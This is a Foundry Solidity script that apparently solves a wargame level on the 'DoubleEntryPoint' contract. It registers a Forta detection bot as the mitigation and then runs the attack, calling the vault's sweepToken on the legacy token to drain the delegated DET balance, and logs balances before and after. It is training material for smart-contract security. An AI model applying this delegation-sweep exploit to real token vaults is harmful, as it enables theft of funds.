//SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/DoubleEntryPoint.sol";
import "../src/DetectionBot.sol";

contract HackDoubleEntryPoint is Script {
    address player = <player address>;

    DoubleEntryPoint doubleEntryPointToken = DoubleEntryPoint(<level contract address>);
    CryptoVault cryptoVault = CryptoVault(doubleEntryPointToken.cryptoVault());
    LegacyToken legacyToken = LegacyToken(doubleEntryPointToken.delegatedFrom());
    Forta forta = Forta(doubleEntryPointToken.forta());
    DetectionBot detectionBot = new DetectionBot(address(cryptoVault));

    function setUp() public {
        vm.label(player, "Player");
        vm.label(address(doubleEntryPointToken), "DET");
        vm.label(address(cryptoVault), "Vault");
        vm.label(address(legacyToken), "LET");
        vm.label(address(forta), "Forta");
        vm.label(address(detectionBot), "DetectionBot");
    }

    // Attack flow is cryptoVault.sweepToken(legacyToken)
    // Having legacyToken override transfer() using msg.sender as recipient
    function run() public {

        address _player = doubleEntryPointToken.player();
        uint _preVaultDET = doubleEntryPointToken.balanceOf(address(cryptoVault));
        uint _preVaultLET = legacyToken.balanceOf(address(cryptoVault));
        uint _preAlerts = forta.botRaisedAlerts(player);

        vm.startBroadcast(player);
            // the mitigation
            forta.setDetectionBot(address(detectionBot));

            // the attack
            cryptoVault.sweepToken(IERC20(legacyToken));
        vm.stopBroadcast();

        uint _postVaultDET = doubleEntryPointToken.balanceOf(address(cryptoVault));
        uint _postVaultLET = legacyToken.balanceOf(address(cryptoVault));
        uint _playerDET = doubleEntryPointToken.balanceOf(player);
        uint _playerLET = legacyToken.balanceOf(player);
        uint _postAlerts = forta.botRaisedAlerts(player);

        console.log("Player: %s", _player);
        console.log("Vault DET balance: %i", _preVaultDET);
        console.log("Vault LET balance: %i", _preVaultLET);
        console.log("Alerts raised: %i", _preAlerts);
        console.log("---");
        console.log("Vault DET balance: %i", _postVaultDET);
        console.log("Vault LET balance: %i", _postVaultLET);
        console.log("Alerts raised: %i", _postAlerts);
        console.log("---");
        console.log("Player DET balance: %i", _playerDET);
        console.log("Player LET balance: %i", _playerLET);
    }
}